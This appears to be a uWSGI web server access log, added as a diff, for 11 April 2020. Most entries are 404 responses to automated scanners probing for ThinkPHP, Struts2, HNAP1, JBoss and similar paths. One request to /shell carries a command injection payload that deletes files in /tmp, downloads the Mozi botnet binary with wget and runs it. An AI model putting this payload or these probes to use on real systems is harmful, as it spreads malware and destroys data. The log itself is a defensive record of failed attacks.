@@ -1,0 +1,86 @@
+[1586534402] ./uwsgi.log reopened.
+[2020-04-11 02:23:27] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 221/318] 49.234.131.16 () {42 vars in 794 bytes} [Sat Apr 11 02:23:27 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 02:23:27] [WARNING] Not Found: /index.php
+[pid: 10812|app: 0|req: 51/319] 49.234.131.16 () {42 vars in 822 bytes} [Sat Apr 11 02:23:27 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 02:33:35] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 222/320] 103.220.28.246 () {32 vars in 465 bytes} [Sat Apr 11 02:33:35 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 04:11:21] [WARNING] Not Found: /portal/redlion
+[pid: 10815|app: 0|req: 223/321] 182.254.52.17 () {36 vars in 570 bytes} [Sat Apr 11 04:11:21 2020] GET /portal/redlion => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 05:41:56] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 52/322] 221.192.134.90 () {34 vars in 396 bytes} [Sat Apr 11 05:41:56 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 06:09:47] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 53/323] 101.89.19.140 () {36 vars in 542 bytes} [Sat Apr 11 06:09:47 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 06:17:17] [WARNING] Not Found: /sqlite/main.php
+[pid: 10812|app: 0|req: 54/324] 182.254.52.17 () {36 vars in 572 bytes} [Sat Apr 11 06:17:17 2020] GET /sqlite/main.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 07:01:57] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 55/325] 36.81.77.58 () {32 vars in 462 bytes} [Sat Apr 11 07:01:57 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 08:52:36] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 56/326] 36.75.142.162 () {32 vars in 463 bytes} [Sat Apr 11 08:52:36 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10815|app: 0|req: 224/327] 59.36.132.240 () {36 vars in 594 bytes} [Sat Apr 11 09:26:40 2020] GET /video/play/51725/1-11.html => generated 15152 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[2020-04-11 11:15:30] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 225/328] 185.30.45.93 () {32 vars in 462 bytes} [Sat Apr 11 11:15:30 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 12:18:58] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 226/329] 182.254.52.17 () {36 vars in 542 bytes} [Sat Apr 11 12:18:58 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 13:07:44] [WARNING] Not Found: /HNAP1
+[pid: 10815|app: 0|req: 227/330] 182.254.52.17 () {36 vars in 552 bytes} [Sat Apr 11 13:07:44 2020] GET /HNAP1 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 13:11:15] [WARNING] Not Found: /invoker/readonly
+[pid: 10815|app: 0|req: 228/331] 49.234.18.128 () {42 vars in 659 bytes} [Sat Apr 11 13:11:15 2020] POST /invoker/readonly => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 13:28:14] [WARNING] Not Found: /nmaplowercheck1586468629
+[pid: 10815|app: 0|req: 229/332] 182.254.52.17 () {36 vars in 590 bytes} [Sat Apr 11 13:28:14 2020] GET /nmaplowercheck1586468629 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 16:03:36] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 230/333] 45.76.144.219 () {36 vars in 432 bytes} [Sat Apr 11 16:03:36 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 16:29:46] [WARNING] Not Found: /TP/public/index.php
+[pid: 10815|app: 0|req: 231/334] 49.233.66.116 () {34 vars in 500 bytes} [Sat Apr 11 16:29:46 2020] GET /TP/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 16:29:50] [WARNING] Not Found: /TP/index.php
+[pid: 10812|app: 0|req: 57/335] 49.233.66.116 () {34 vars in 486 bytes} [Sat Apr 11 16:29:50 2020] GET /TP/index.php => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 16:29:50] [WARNING] Not Found: /thinkphp/html/public/index.php
+[pid: 10814|app: 0|req: 24/336] 49.233.66.116 () {34 vars in 522 bytes} [Sat Apr 11 16:29:50 2020] GET /thinkphp/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 16:31:46] [WARNING] Not Found: /index.php
+[pid: 10814|app: 0|req: 25/337] 182.254.52.17 () {36 vars in 560 bytes} [Sat Apr 11 16:31:46 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 17:10:08] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 232/338] 49.234.131.16 () {42 vars in 798 bytes} [Sat Apr 11 17:10:08 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 17:10:08] [WARNING] Not Found: /index.php
+[pid: 10812|app: 0|req: 58/339] 49.234.131.16 () {42 vars in 826 bytes} [Sat Apr 11 17:10:08 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 17:20:19] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 233/340] 171.67.70.85 () {34 vars in 392 bytes} [Sat Apr 11 17:20:19 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 17:57:30] [WARNING] Not Found: /shell
+[pid: 10815|app: 0|req: 234/341] 114.236.224.219 () {34 vars in 643 bytes} [Sat Apr 11 17:57:30 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 18:03:30] [WARNING] Not Found: /invoker/readonly
+[pid: 10815|app: 0|req: 235/342] 49.234.18.128 () {42 vars in 659 bytes} [Sat Apr 11 18:03:30 2020] POST /invoker/readonly => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 18:53:48] [WARNING] Not Found: /hudson
+[pid: 10815|app: 0|req: 236/343] 192.241.238.11 () {34 vars in 406 bytes} [Sat Apr 11 18:53:48 2020] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10815|app: 0|req: 237/344] 117.150.213.165 () {42 vars in 807 bytes} [Sat Apr 11 19:00:32 2020] GET /video/play/76875/2-29.html => generated 22370 bytes in 47 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[2020-04-11 19:43:50] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 238/345] 49.234.131.16 () {42 vars in 798 bytes} [Sat Apr 11 19:43:50 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 19:43:50] [WARNING] Not Found: /index.php
+[pid: 10812|app: 0|req: 59/346] 49.234.131.16 () {42 vars in 826 bytes} [Sat Apr 11 19:43:50 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 22:54:52] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 239/347] 84.22.59.2 () {32 vars in 467 bytes} [Sat Apr 11 22:54:52 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:13:27] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 240/348] 177.67.159.208 () {32 vars in 464 bytes} [Sat Apr 11 23:13:27 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:32:52] [WARNING] Not Found: /struts2-rest-showcase/orders.xhtml
+[pid: 10815|app: 0|req: 241/349] 49.234.18.128 () {40 vars in 2577 bytes} [Sat Apr 11 23:32:52 2020] GET /struts2-rest-showcase/orders.xhtml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:32:52] [WARNING] Not Found: /index.action
+[pid: 10812|app: 0|req: 60/350] 49.234.18.128 () {40 vars in 2511 bytes} [Sat Apr 11 23:32:52 2020] GET /index.action => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 23:32:52] [WARNING] Not Found: /index.do
+[pid: 10812|app: 0|req: 61/351] 49.234.18.128 () {40 vars in 2499 bytes} [Sat Apr 11 23:32:52 2020] GET /index.do => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:55:42] [WARNING] Not Found: /TP/public/index.php
+[pid: 10815|app: 0|req: 242/352] 118.25.79.208 () {34 vars in 500 bytes} [Sat Apr 11 23:55:42 2020] GET /TP/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:55:42] [WARNING] Not Found: /TP/index.php
+[pid: 10812|app: 0|req: 62/353] 118.25.79.208 () {34 vars in 486 bytes} [Sat Apr 11 23:55:42 2020] GET /TP/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:55:42] [WARNING] Not Found: /thinkphp/html/public/index.php
+[pid: 10814|app: 0|req: 26/354] 118.25.79.208 () {34 vars in 522 bytes} [Sat Apr 11 23:55:42 2020] GET /thinkphp/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 23:55:42] [WARNING] Not Found: /html/public/index.php
+[pid: 10813|app: 0|req: 25/355] 118.25.79.208 () {34 vars in 504 bytes} [Sat Apr 11 23:55:42 2020] GET /html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 23:55:42] [WARNING] Not Found: /public/index.php
+[pid: 10813|app: 0|req: 26/356] 118.25.79.208 () {34 vars in 494 bytes} [Sat Apr 11 23:55:42 2020] GET /public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:55:42] [WARNING] Not Found: /TP/html/public/index.php
+[pid: 10813|app: 0|req: 27/357] 118.25.79.208 () {34 vars in 510 bytes} [Sat Apr 11 23:55:42 2020] GET /TP/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:55:42] [WARNING] Not Found: /elrekt.php
+[pid: 10814|app: 0|req: 27/358] 118.25.79.208 () {34 vars in 482 bytes} [Sat Apr 11 23:55:42 2020] GET /elrekt.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-11 23:55:42] [WARNING] Not Found: /index.php
+[pid: 10814|app: 0|req: 28/359] 118.25.79.208 () {34 vars in 480 bytes} [Sat Apr 11 23:55:42 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-11 23:55:42] [WARNING] Not Found: /
+[pid: 10814|app: 0|req: 29/360] 118.25.79.208 () {34 vars in 465 bytes} [Sat Apr 11 23:55:42 2020] GET / => generated 179 bytes in 0 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[1586620802] logsize: 11438, triggering log-reopen...
